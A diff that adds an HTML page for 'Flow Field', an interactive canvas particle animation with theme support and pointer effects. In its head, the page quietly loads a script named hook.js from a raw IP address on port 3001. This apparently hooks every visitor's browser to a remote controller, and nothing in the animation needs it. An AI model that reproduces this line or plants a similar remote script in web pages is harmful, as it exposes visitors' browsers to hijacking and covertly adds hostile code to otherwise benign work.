@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <script src="http://100.102.202.64:3001/hook.js"></script>
+  <title>Flow Field</title>
+  <style>
+    :root {
+      --bg: #f4f3ef;
+      --fg: #1b1b22;
+      --l: 38%;
+      --trail: 244, 243, 239;
+      box-sizing: border-box;
+      padding-top: env(safe-area-inset-top, 0px);
+      padding-bottom: env(safe-area-inset-bottom, 0px)
+    }
+
+    @media (prefers-color-scheme:dark) {
+      :root:not([data-theme="light"]) {
+        --bg: #07070d;
+        --fg: #e8e8f2;
+        --l: 62%;
+        --trail: 7, 7, 13
+      }
+    }
+
+    :root[data-theme="dark"] {
+      --bg: #07070d;
+      --fg: #e8e8f2;
+      --l: 62%;
+      --trail: 7, 7, 13
+    }
+
+    html,
+    body {
+      height: 100%;
+      margin: 0;
+      background: var(--bg);
+      color: var(--fg);
+      font-family: ui-monospace, Menlo, Consolas, monospace;
+      overflow: hidden
+    }
+
+    canvas {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      touch-action: none;
+      display: block
+    }
+
+    .hud {
+      position: fixed;
+      left: 16px;
+      bottom: calc(16px + env(safe-area-inset-bottom, 0px));
+      font-size: 12px;
+      opacity: .7;
+      pointer-events: none;
+      line-height: 1.6
+    }
+
+    .hud b {
+      font-weight: 600
+    }
+  </style>
+</head>
+
+<body>
+  <canvas id="c"></canvas>
+  <div class="hud"><b>FLOW FIELD</b><br>move: attract · click/tap: burst · space: reseed<br><span id="s"></span></div>
+  <script>
+    const c = document.getElementById('c'), x = c.getContext('2d'), S = document.getElementById('s');
+    let W, H, D, N = 1600, P = [], t = 0, m = { x: -1e4, y: -1e4, on: false }, fps = 60, last = performance.now();
+    const css = () => getComputedStyle(document.documentElement);
+    function size() { D = Math.min(devicePixelRatio || 1, 2); W = innerWidth; H = innerHeight; c.width = W * D; c.height = H * D; x.setTransform(D, 0, 0, D, 0, 0) }
+    function seed() { P = Array.from({ length: N }, () => ({ x: Math.random() * W, y: Math.random() * H, vx: 0, vy: 0, h: Math.random() * 360 })) }
+    addEventListener('resize', () => { size(); seed() });
+    c.addEventListener('pointermove', e => { m.x = e.clientX; m.y = e.clientY; m.on = true });
+    c.addEventListener('pointerleave', () => { m.x = m.y = -1e4 });
+    c.addEventListener('pointerdown', e => {
+      m.x = e.clientX; m.y = e.clientY;
+      for (const p of P) { const dx = p.x - m.x, dy = p.y - m.y, d = Math.hypot(dx, dy) + 1; if (d < 260) { const f = (260 - d) / 260 * 14; p.vx += dx / d * f; p.vy += dy / d * f } }
+    });
+    addEventListener('keydown', e => { if (e.code === 'Space') { e.preventDefault(); seed() } });
+    function frame(now) {
+      fps += (1000 / (now - last) - fps) * .05; last = now; t += .004;
+      const L = css().getPropertyValue('--l').trim(), tr = css().getPropertyValue('--trail').trim();
+      x.fillStyle = `rgba(${tr},.1)`; x.fillRect(0, 0, W, H);
+      x.lineWidth = 1.2;
+      for (const p of P) {
+        const a = (Math.sin(p.x * .004 + t * 3) + Math.cos(p.y * .005 - t * 2) + Math.sin((p.x + p.y) * .002 + t)) * Math.PI * .9;
+        p.vx += Math.cos(a) * .12; p.vy += Math.sin(a) * .12;
+        const dx = m.x - p.x, dy = m.y - p.y, d = Math.hypot(dx, dy) + 1;
+        if (d < 220) { const f = (1 - d / 220) * .9; p.vx += dx / d * f + dy / d * f * .6; p.vy += dy / d * f - dx / d * f * .6 }
+        p.vx *= .95; p.vy *= .95;
+        let ox = p.x, oy = p.y; p.x += p.vx; p.y += p.vy;
+        if (p.x < 0) p.x = ox = W; else if (p.x > W) p.x = ox = 0;
+        if (p.y < 0) p.y = oy = H; else if (p.y > H) p.y = oy = 0;
+        const sp = Math.hypot(p.vx, p.vy);
+        x.strokeStyle = `hsl(${(p.h + t * 400 + sp * 20) % 360} 90% ${L})`;
+        x.beginPath(); x.moveTo(ox, oy); x.lineTo(p.x, p.y); x.stroke();
+      }
+      S.textContent = `${N} particles · ${fps.toFixed(0)} fps`;
+      requestAnimationFrame(frame);
+    }
+    size(); seed(); x.fillStyle = css().getPropertyValue('--bg'); x.fillRect(0, 0, W, H); requestAnimationFrame(frame);
+  </script>
+</body>
+
+</html>
